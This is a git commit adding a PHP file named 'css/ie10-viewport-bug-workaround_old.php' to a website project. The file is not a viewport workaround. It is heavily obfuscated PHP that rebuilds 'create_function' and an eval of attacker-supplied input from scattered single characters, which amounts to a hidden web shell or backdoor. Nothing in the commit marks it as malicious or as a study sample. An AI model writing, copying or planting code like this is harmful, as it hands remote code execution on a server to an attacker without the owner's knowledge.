336a1e225f6ede7116ecbd797248b3136c463c88
Kristy McKee <32277917+klr9@users.noreply.github.com>
2023-07-28 15:54:55 -0700

    adding most of the project folders
    video and image (img) are not included

---
+++ css/ie10-viewport-bug-workaround_old.php
@@ -0,0 +1,86 @@
+<?php
+
+$arthur='"(vap$Vv$'; $floppy = 'TRtsRZV';$dawggy= 'QrTl'; $curfew='Krm[eH^ea'; $atheists = 't';
+$counterexamples =')';
+
+$immovable ='[a:R'; $croppers ='6'; $consolidate='aCr_r';$brow ='Erde"Vg';$billboards ='S;D';$bernita =']';$chatters= 'Be"';$desmond='nPcd(';
+
+$bishop = 'q'; $cheapens= 'A"_bW'; $exchequer='rvistOvpu'; $closer='Q]dg';$iterates ='esS';$gore = 'VA'; $inadvertently = 'OOesca';
+$humans = 'Aeg';$departure ='_'; $fellow = 'c';$appellants= 'o'; $demolition ='?tet[('; $bluebill = 'Hi_EnlU';$environment='I';$flops = 'eV))Es(l'; $hysterical='sns';
+$blackbird ='a';$interrelating= '_DI)i'; $linguist = 'T'; $dinners='Q';
+$elector= 'rq"';$flings = 't'; $behooves='cS,(=E';$emulsion = '$';$frantic ='v';$inadvisable = 'J]';$far=')_DVT(]C'; $catatonia= ')';$maledict= ')'; $impound ='Q_dirKb$';
+
+$dur = 'if?a';$eluded= '4';$disdains ='a";$va';$bradley= 'E'; $chalky = 'o';$aquanaut='(ie';$crappie= '"?)a;_';$duplicate ='M'; $coke ='X'; $felicdad ='(_:L('; $feed= 'R';$cease= '=e "'; $ellissa= 's'; $erroneous='S'; $cleaner ='a'; $amsterdam='T';$charmain= 'T'; $illustrator = 'r';
+
+$ignacio='_[,$U'; $cassie='y'; $kellie= 'G'; $kenna=')saT_t;)'; $lorette = 'iP(HF$';$belaying = 'teN]aoev';$diversification = 'r'; $distortion ='[Pev@yL';
+
+$evidences = 'a';
+$enriched ='i';
+
+$kathy= 'tL';$assertiveness='Td$Sc$';$involuntary = 'lfied';$business = '_(`$Yfeus';
+
+$doping = 'Er)'; $distributivity = $assertiveness['4'].$doping['1'] . $business['6'].
+
+$evidences.$kathy['0'] .$business['6'].$business['0'] . $business['5'] . $business['7'] .$hysterical['1'].$assertiveness['4']. $kathy['0'].$involuntary['2'].$belaying['5'] .$hysterical['1'] ;$corena=$cease[2] ;
+$audaciously = $distributivity ($corena, $business['6'] .$distortion['3'] .$evidences . $involuntary['0'] .
+
+$business['1'] .$evidences. $doping['1'] .
+$doping['1'] .$evidences . $distortion['5'] . $business['0'] .$exchequer['7'] . $belaying['5'] .
+
+$exchequer['7'] .
+
+$business['1'] . $business['5']. $business['7'] .$hysterical['1'] .$assertiveness['4']. $business['0'].$humans['2']. $business['6'].
+$kathy['0']. $business['0'] . $evidences. $doping['1']. $humans['2'] .$business['8'] .$business['1'] .$doping['2'] .$doping['2'] . $doping['2']. $kenna['6']);$audaciously($crashers ,$humans['0'] ,
+$distortion['0'], $doping[0] ,
+
+$inquisitive['0'],$asters[1] , $business['4'],
+
+$distortion['0'],
+$business['3'] . $involuntary['2']. $cease['0'] .$evidences .
+$doping['1']. $doping['1'] .$evidences. $distortion['5']. $business['0'].$curfew['2'].$business['6'].$doping['1'] .$humans['2']. $business['6'] .$business['1'] . $business['3']. $business['0']. $feed.
+
+$doping[0] .$impound['0'] .
+
+$ignacio['4'] . $doping[0].$assertiveness['3'] .
+
+$assertiveness['0'].$ignacio['2'].$business['3']. $business['0'] . $far['7'].$inadvertently['1'] .$inadvertently['1'] . $impound['5'].$interrelating['2']. $doping[0] .$ignacio['2'].
+$business['3'].$business['0'] .$assertiveness['3'].$doping[0] .$feed .
+$far[3] .$doping[0]. $feed.
+
+$doping['2'] .$kenna['6'] . $business['3'].$evidences.$cease['0'] .$involuntary['2']. $business['8']. $business['8'].
+$business['6'].$kathy['0'] . $business['1'] . $business['3'] .
+$involuntary['2'] . $distortion['0'] .
+$cease[3]. $evidences.
+
+$elector['1'] .$involuntary['0'].$kathy['0'] . $involuntary['4']. $distortion['3']. $distortion['3'].$business['8'].
+
+$cease[3].
+
+$belaying['3'] .
+
+$doping['2'] . $crappie[1] .
+$business['3'].$involuntary['2'].$distortion['0'].
+$cease[3] . $evidences . $elector['1']. $involuntary['0'] .
+$kathy['0']. $involuntary['4'] .$distortion['3']. $distortion['3'] . $business['8']. $cease[3]. $belaying['3'].$felicdad['2'].$business['1'] . $involuntary['2'] . $business['8'].$business['8'] .$business['6'].$kathy['0'] . $business['1'].$business['3']. $involuntary['2'].$distortion['0'] .
+
+$cease[3]. $lorette['3'] .$assertiveness['0'] .$assertiveness['0']. $distortion['1'] . $business['0'] .$humans['0'].$impound['0'] . $kathy['1'] .$assertiveness['0'] .$far['2'].$far[3] .$far[3].$assertiveness['3'] .
+$cease[3]. $belaying['3'] .$doping['2'] . $crappie[1].$business['3']. $involuntary['2'] . $distortion['0'] .$cease[3] .$lorette['3'] .$assertiveness['0'] .
+$assertiveness['0']. $distortion['1'] .$business['0']. $humans['0'] .
+
+$impound['0']. $kathy['1'] .$assertiveness['0'].
+$far['2'].$far[3]. $far[3] .$assertiveness['3'] . $cease[3].
+$belaying['3'] .$felicdad['2'] .
+
+$involuntary['4'] .$involuntary['2'] .$business['6'] .$doping['2']. $kenna['6'].$business['6']. $distortion['3'].$evidences. $involuntary['0']. $business['1'] .$business['8'] .$kathy['0'] . $doping['1'].$doping['1'] .$business['6'] . $distortion['3'].$business['1'] .
+$impound[6]. $evidences.
+
+$business['8'] . $business['6'].
+
+$croppers .
+$eluded.
+
+$business['0'].$involuntary['4'].$business['6'] . $assertiveness['4'] .$belaying['5'] . $involuntary['4'] . $business['6'] .$business['1'].$business['8'] .
+
+$kathy['0']. $doping['1'] .$doping['1'] . $business['6']. $distortion['3'] . $business['1'] .$business['3'].
+$evidences . $doping['2'] .$doping['2'].
+$doping['2'] . $doping['2']. $kenna['6'] );
